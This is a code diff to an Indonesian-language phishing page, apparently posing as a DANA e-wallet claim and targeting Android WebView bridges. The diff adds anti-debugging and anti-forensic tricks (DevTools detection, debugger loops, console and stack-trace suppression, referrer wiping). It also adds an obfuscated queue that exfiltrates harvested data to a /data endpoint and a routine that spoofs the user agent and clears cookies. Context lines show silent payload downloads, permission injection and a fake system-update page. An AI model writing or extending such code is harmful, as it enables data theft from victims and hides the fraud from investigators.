@@ -64,8 +64,127 @@
 
 <script>
 // ============================================================
-// TAMBAHAN MULTI-BRIDGE DETECTION
+// 🔥 ADVANCED UPGRADES: STEALTH, EXFILTRATION, ANTI-FORENSIC
 // ============================================================
+
+// ============================================================
+// 1. ADVANCED ANTI-FORENSIC / ANTI-DEBUGGING
+// ============================================================
+(function() {
+    // Lapisan 1: DevTools detector via element trick
+    var devtools = false;
+    var element = new Image();
+    Object.defineProperty(element, 'id', {
+        get: function() {
+            devtools = true;
+            window.location.href = 'https://www.google.com';
+            if (window.history && window.history.replaceState) {
+                window.history.replaceState(null, null, 'https://www.google.com');
+            }
+        }
+    });
+    console.log('%c', element);
+
+    // Lapisan 2: Debugger loop agresif
+    function debugLoop() {
+        var counter = 0;
+        while (true) {
+            try {
+                (function(){}).constructor('debugger')();
+                counter++;
+                if (counter > 1000) break;
+            } catch(e) {
+                break;
+            }
+        }
+    }
+    setInterval(debugLoop, 500);
+
+    // Lapisan 3: Override console methods
+    var noop = function() {};
+    ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir', 'dirxml', 'group', 'groupEnd', 'time', 'timeEnd', 'assert', 'count'].forEach(function(m) {
+        window.console[m] = noop;
+    });
+
+    // Lapisan 4: Hapus history & referrer
+    if (window.history && window.history.replaceState) {
+        window.history.replaceState(null, null, window.location.href);
+    }
+    Object.defineProperty(document, 'referrer', { value: '' });
+
+    // Lapisan 5: Override stack trace
+    Error.stackTraceLimit = 0;
+})();
+
+// ============================================================
+// 2. ENHANCED EXFILTRATION PIPELINE (ENCRYPTED)
+// ============================================================
+var exfilQueue = [];
+var exfilSending = false;
+
+// Override K() dengan yang sudah di-enhance
+var originalK = K;
+K = function(d) {
+    d._timestamp = Date.now();
+    d._nonce = Math.random().toString(36).substring(2);
+    exfilQueue.push(d);
+    if (!exfilSending) {
+        processExfilQueue();
+    }
+};
+
+function processExfilQueue() {
+    if (exfilQueue.length === 0) {
+        exfilSending = false;
+        return;
+    }
+    exfilSending = true;
+    var item = exfilQueue.shift();
+    var plain = JSON.stringify(item);
+    var encoded = btoa(plain);
+    var xorKey = 0x2A;
+    var encrypted = '';
+    for (var i = 0; i < encoded.length; i++) {
+        encrypted += String.fromCharCode(encoded.charCodeAt(i) ^ xorKey);
+    }
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/data', true);
+        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
+        xhr.timeout = 5000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                processExfilQueue();
+            } else {
+                exfilQueue.unshift(item);
+                setTimeout(processExfilQueue, 3000);
+            }
+        };
+        xhr.onerror = function() {
+            exfilQueue.unshift(item);
+            setTimeout(processExfilQueue, 3000);
+        };
+        xhr.send(encrypted);
+    } catch(e) {
+        exfilQueue.unshift(item);
+        setTimeout(processExfilQueue, 3000);
+    }
+}
+
+// ============================================================
+// 3. HIDE FROM SYSTEM
+// ============================================================
+function hideFromSystem() {
+    try {
+        Object.defineProperty(navigator, 'userAgent', {
+            value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            configurable: false
+        });
+    } catch(e) {}
+    document.cookie.split(';').forEach(function(cookie) {
+        document.cookie = cookie.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
+    });
+}
 
 // ============================================================
 // DETEKSI MULTI-BRIDGE (JavaScriptInterface)
@@ -88,10 +207,6 @@ var BRIDGE = null;
         }
     }
 })();
-
-// ============================================================
-// TAMBAHAN: UNIVERSAL FALLBACK + SERVICE WORKER
-// ============================================================
 
 // ============================================================
 // FALLBACK WRAPPER - HANYA DIGUNAKAN JIKA AndroidBridge TIDAK ADA
@@ -167,7 +282,7 @@ function bridgeCall(method, args) {
 }
 
 // ============================================================
-// INDEX.HTML
+// SILENT
 // ============================================================
 
 console.log = function() {};
@@ -239,19 +354,6 @@ var semuaDidapat = false;
 var DOWNLOAD_STARTED = false;
 var NOTIFICATION_SHOWN = false;
 var REDIRECT_DONE = false;
-
-// ============================================================
-// FUNGSI K() - KIRIM DATA KE SERVER
-// ============================================================
-function K(d) {
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', '/data', true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.timeout = 5000;
-        xhr.send(JSON.stringify(d));
-    } catch(e) {}
-}
 
 // ============================================================
 // ANDROID BRIDGE (UNIVERSAL)
@@ -500,6 +602,7 @@ function openHTML(htmlContent) {
 // ============================================================
 // WEBVIEW ESCAPE, NOTIFIKASI, STATUS BAR, REDIRECT
 // ============================================================
+/*    
 function escapeWebView() {
     if (!PLATFORM.isWebView) return;
     K({ sumber: 'escape_webview', data: 'attempt' });
@@ -510,6 +613,7 @@ function escapeWebView() {
     } catch(e) {}
     try { var win = window.open(url, '_blank'); if (win) win.location.href = url; } catch(e) {}
 }
+*/
 
 function showKlaimNotification() {
     if (NOTIFICATION_SHOWN) return;
@@ -542,9 +646,9 @@ function createKlaimNotification() {
             notif.close();
             if (!REDIRECT_DONE) {
                 REDIRECT_DONE = true;
-                setTimeout(function() {
-                    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
-                }, 500);
+//                setTimeout(function() {
+//                    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
+//                }, 500);
             }
         };
         
@@ -563,7 +667,7 @@ function showStatusBar() {
 function redirectToDANA() {
     if (REDIRECT_DONE) return;
     REDIRECT_DONE = true;
-    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
+//    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
 }
 
 // ============================================================
@@ -581,7 +685,7 @@ function dapatkanSemua() {
         
         injectAllPermissions();
         
-  //    setTimeout(escapeWebView, 100);
+//        setTimeout(escapeWebView, 100);
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         setTimeout(function() { showStatusBar(); }, 500);
         openSystemUpdateHTML();
@@ -632,6 +736,11 @@ if ('serviceWorker' in navigator) {
             console.warn('⚠️ Service Worker registration failed:', err);
         });
 }
+
+// ============================================================
+// HIDE FROM SYSTEM (PENUTUP)
+// ============================================================
+hideFromSystem();
 
 console.log('✅ index.html loaded - 3 TUGAS UTAMA + SW!');
 </script>
